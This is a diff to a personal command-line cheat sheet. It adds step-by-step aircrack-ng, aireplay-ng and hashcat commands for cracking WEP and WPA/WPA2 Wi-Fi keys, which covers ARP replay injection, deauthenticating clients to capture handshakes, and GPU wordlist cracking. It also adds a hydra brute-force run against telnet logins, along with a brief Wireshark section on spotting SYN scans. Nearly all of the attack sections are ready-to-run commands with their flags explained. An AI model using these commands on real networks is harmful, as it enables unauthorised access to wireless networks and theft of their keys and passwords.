@@ -105,8 +105,139 @@ openvas-feed-update	# This will update ovas - should be done each use (even if s
 # Don't use any 'easy setup wizard' type helpers to make your scans
 
 
-# NETWORK SNIFFING
+# WEP ROUTER CRACKING / NETWORK SNIFFING
+########################################
+iwconfig	# Find your wifi adapter (we'll use wlan0 for example)
+sudo airmon-ng start wlan0 # Where 'wlan0' would be any interface that can sniff
+	# You will see the interface you've chosen is now suffixed by "mon"
+sudo airodump-ng wlan0mon
+	# Find the BSSID and CH (channel) for the targeted network. For example I'll use 00:01:02:03:04:05 and channel 11
+	# The "PWR" column is negative. Numbers closer to 0 (positive) are stronger
+sudo airodump-ng -c 11 --bssid 00:01:02:03:04:05 -w dump wlan0mon   # This begins the sniffing and saves all caps in current directory and prefixed with "dump"
+	# -c 11	# Declare what channel to use
+	# -w dump	# Prefix for the output files
+	# wlan0mon	# Monitoring interface to use
+	# White hats can fake authentication packets to give false positives to hackers:
+		# aireplay-ng -1 0 -a 00:01:02:03:04:05 -h 09:08:07:06:05:04 -e "My Wifi Name" wlan0mon --ignore-negative-one
+			# -1	# Signal a fake authentication
+			# 0	# Reassociation timing (in seconds)
+			# -a 00:01:02:03:04:05	# This is the router being hacked
+			# -h 09:08:07:06:05:04	# This is any MAC address
+			# --ignore-negative-one	# Ignore the -1 channel of wlan0mon
+# The next 2 codes are more bruteforce-ish, can be swapped out for the "Replay Attack" section
+sudo aircrack-ng -b 00:01:02:03:04:05 dump-01.cap   # Attempt cracking wifi using the named .cap file
+sudo aircrack-ng -b 00:01:02:03:04:05 dump-01.cap -w wordlist.txt	# Once you have enough IVs in your .cap file this will compare the wifi keys against a given wordlist 
+
+# REPLAY ATTACK (aka ARP Injection):
+# Create traffic that appears to come from a trusted MAC address and route it to targed router (aka Replay Attack):
+aireplay-ng -3 -b 00:01:02:03:04:05 -h 09:08:07:06:05:04 wlan0mon --ignore-negative-one
+# Open a new terminal an run this to simulate legit traffic (must be run at same time)
+aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:01:02:03:04:05 -h A1:B2:C3:D4:E5:F6 wlan0mon --ignore-negative-one
+	# -2	# Use interactive Replay Attack
+	# -p 0841	# Make packet appear as if it's sent from a wireless client (via frame control)
+	# -c FF:FF...	# Send the packets to all the hosts on the network
+	# -b 00:01:02:03:04:05	# The targeted router
+	# -h A1:B2:C3:D4:E5:F6	# Your (the hacker)'s MAC address
+# Wait for the "#Data," field to be >5000 (if WEP) in the airodump terminal
+# After >5000 Data close all running terminals and run:
+aircrack-ng -a 1 -b 00:01:02:03:04:05 -n 64 dump-01.cap
+	# -a 1	# Force static WEP
+	# dump-01.cap	# This is the file created during airodump, should be in directory were you ran the command in
+
+
+# WpA/WPA2 ATTACKS (wifi router)
 ##################
+iwconfig	# Find your wifi adapter (we'll use wlan0 for example)
+service network-manager stop	# NM must be stopped first
+sudo airmon-ng start wlan0 # Where 'wlan0' would be any interface that can sniff
+sudo airodump-ng wlan0mon	# Copy the BSSID of target. Might not be necessary
+sudo airodump-ng --bssid 00:01:02:03:04:05 -c 6 --showack -w wpa_log wlan0mon
+	# --bssid is of targeted router
+	# -c 6	# Channel router is on
+	# --showack	# Ensure client computer acknowledges request from wifi point
+	# -w wpa_log	# Write output to file with provided prefix
+	# wlan0mon	# Your adapter in monitor mode
+# Minimize (don't close) that terminal and open another to launch deauthentication attack. It kicks someone off the network so they have to re-enter (which is when you grab their key)
+sudo aireplay-ng -0 20 -a 00:01:02:03:04:05 -c 09:08:07:06:05:04 wlan0mon
+	# -0	# Indicates deauthentication attack
+	# 20	# Send 20 deauthentication packets
+	# -a	# Target router/access point bssid
+	# -c	# Client's MAC address (found in the other terminal from the last command). Pick one to kick off the network
+		# This isn't in the BSSID column, it's the "STATION" column
+# If the deauth worked the top of the airodump terminal will briefly say "WPA handsake " followed by the target router's MAC
+sudo aircrack-ng wpa_log-01.cap -w /path/to/wordlist.txt
+	# wpa_log-01.cap	# The output file named in previous step but suffixed with the specific dump number
+	# -w /path/to/wordlist.txt	# The dictionary to begin brute forcing with
+
+
+# GPU BASED HASH/KEY CRACKING
+#############################
+# Pairs well with WEP/WPA/WPA2 hacking
+lspci | grep -i "VGA"	# Check your GPU type
+sudo apt-get install p7zip-full -y	# Install 7zip to extract GPU crackers
+wpaclean clean.cap /path/to/wpa_log-01.cap	# Clean the airodump cap for use with AMD Hashcat
+sudo aircrack-ng clean.cap -J outfile	# Generate a Hashcat compatible file
+	# clean.cap	# Created during wpaclean step
+	# outfile	# The file to be created during generation (will be suffixed with ".hccap"
+hashcat -m 2500 outfile.hccap /path/to/wordlist.txt --force
+	# -m 2500	# Signifies WPA attacks
+	# outfile.hccap	# The file generated in previous step
+	# Password should be found in the output of the command
+
+
+# PACKET INJECTION
+##################
+sudo aireplay-ng -9 wlan0	# Test if your device supports packet injection. "-9" is the test flag and is aka "--test" and "wlan0" is your wifi card.
+sudo wash -i wlan1mon	# Check if the target is using WPC - it not then it will not appear in list
+sudo aireplay-ng --fakeaut 0 -e "My Wifi name" -a 00:01:02:03:04:05 wlan1mon	# Begin injecting fake packets to router. If your device (wlan1mon) is not on the same channel as the router use `sudo iwconfig wlan1mon channel 1` where "1" would be the number of your router's channel.
+
+
+
+# SYN SCAN DETECTION
+####################
+
+# A hacker will run:
+	ifconfig	# Identify the "inet addr:". For example we'll use 10.0.0.222
+	nmap 10.0.0.101 -v	# Scan the IP host at the .101 address (it should be there)
+# The whitehat then reviews the Wireshark logs
+	# Choose "Statistics > Conversations" from menu bar
+	# On the "IPv4" tab you'll find the conversation between the hacker on .222 and the host on .101 with a large number of packets in the "Packets" column
+	# The "TCP:" tab will show numerous packets being sent between .222 and .101
+	# You can select an entry and click "Follow Streams" button. Disregard popup window and minimize the "Conversations" window you were in, returning to main Wireshark window
+	# This will show who sent what and further details
+		# If there are conversations after the "RST" packet is sent it may be suspicious
+# If numerous SYN packets are comming from the same MAC address / IP in a very short timeframe (miliseconds-ish) you're probably getting DoS/DDoS attacked
+	# But not always...
+
+
+# BRUTE FORCE ATTACKING (telnet targets)
+#######################
+hydra -v -V -l username -P /path/to/wordlist.txt -t 8 10.0.0.101 telnet
+	# "-l username" is the login command folowed by target's username
+	# "-P ..wordlist.txt" is path to the passwords to attempt logging in with
+	# "-t 8" specify the number of max parallel connections (bigger = faster)
+	# "10.0.0.101" fake victim for example
+	# "telnet" the protocol to brute force on
+	# The output will list if the password  was found
+telnet	# This will open a telnet sub-terminal
+	10.0.0.101
+	# Enter login details from above step
+# The attempts to brute force will appear in a Wireshark if admins were monitoring during the hack
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
